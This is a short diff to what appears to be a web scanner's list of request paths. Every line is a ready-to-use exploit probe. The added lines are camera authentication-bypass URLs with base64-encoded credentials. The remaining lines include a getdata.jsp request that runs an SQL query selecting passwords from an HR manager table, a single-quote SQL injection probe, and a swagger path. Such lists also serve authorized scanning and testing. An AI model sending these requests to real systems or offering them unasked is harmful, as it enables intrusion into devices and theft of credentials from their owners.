@@ -1,3 +1,5 @@
+/Security/users?auth=YWRtaW46MTEK
+/onvif-http/snapshot?auth=YWRtaW46MTEK
 /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
 /messageType.do?method=create&typeName=1%27
 /REST/v1/swagger
